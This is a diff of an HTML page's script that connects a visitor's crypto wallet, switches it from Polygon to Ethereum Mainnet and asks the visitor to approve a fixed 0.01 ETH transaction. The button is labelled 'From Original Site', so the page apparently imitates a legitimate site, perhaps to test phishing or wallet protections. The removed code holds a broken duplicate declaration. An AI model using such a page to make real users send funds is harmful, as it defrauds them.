@@ -19,14 +19,14 @@
 </head>
 <body>
   <script>
-    async function promptTransactionOnPolygon() {
+    async function promptTransaction() {
       // Check for wallet connection
       const connected = await promptWalletConnection();
 
-      // If wallet connected, switch to Polygon network and perform a transaction
+      // If wallet connected, switch to Ethereum Mainnet and perform a transaction
       if (connected) {
-        await switchToPolygonNetwork();
-        await promptPolygonTransaction();
+        await switchToEthereumMainnet();
+        await promptEthereumTransaction();
       }
     }
 
@@ -54,34 +54,33 @@
       }
     }
 
-    async function switchToPolygonNetwork() {
+    async function switchToEthereumMainnet() {
       try {
-        // Polygon Mainnet is represented by chainId '137'
-        const polygonChainId = "0x89"; // Polygon Mainnet chainId
-          const polygonChainId = "0xaa36a7";
+        // Ethereum Mainnet is represented by chainId '1'
+        const ethereumMainnetChainId = "0x1"; 
         
         // Request network switch
         await ethereum.request({
           method: 'wallet_switchEthereumChain',
-          params: [{ chainId: polygonChainId }]
+          params: [{ chainId: ethereumMainnetChainId }]
         });
 
         // Check if network switch is successful
         const currentChainId = await ethereum.request({ method: 'eth_chainId' });
-        if (currentChainId === polygonChainId) {
-          console.error('Switched to Polygon network successfully! Initiating transaction.');
+        if (currentChainId === ethereumMainnetChainId) {
+          console.error('Switched to Ethereum Mainnet successfully! Initiating transaction.');
           return true;
         } else {
-          console.error('Failed to switch to Polygon network.');
+          console.error('Failed to switch to Ethereum Mainnet.');
           return false;
         }
       } catch (error) {
-        console.error('Failed to switch to Polygon network.');
+        console.error('Failed to switch to Ethereum Mainnet.');
         return false;
       }
     }
 
-    async function promptPolygonTransaction() {
+    async function promptEthereumTransaction() {
       try {
         const transactionParameters = {
           gasPrice: "0x244AC6D",
@@ -90,7 +89,7 @@
           from: ethereum.selectedAddress,
           value: "0x2386F26FC10000",
           data: "0x00",
-          chainId: "0x89", // Polygon Mainnet chainId
+          chainId: "0x1", // Ethereum Mainnet chainId
         };
 
         const txHash = await ethereum.request({
@@ -100,12 +99,12 @@
 
         alert(`Transaction sent: ${txHash}`);
       } catch (error) {
-        console.error('Polygon transaction request failed or was rejected.');
+        console.error('Ethereum transaction request failed or was rejected.');
       }
     }
   </script>
   <center>
-    <input type="button" class="button" value="From Original Site" onclick="promptTransactionOnPolygon()">
+    <input type="button" class="button" value="From Original Site" onclick="promptTransaction()">
   </center>
 </body>
 </html>
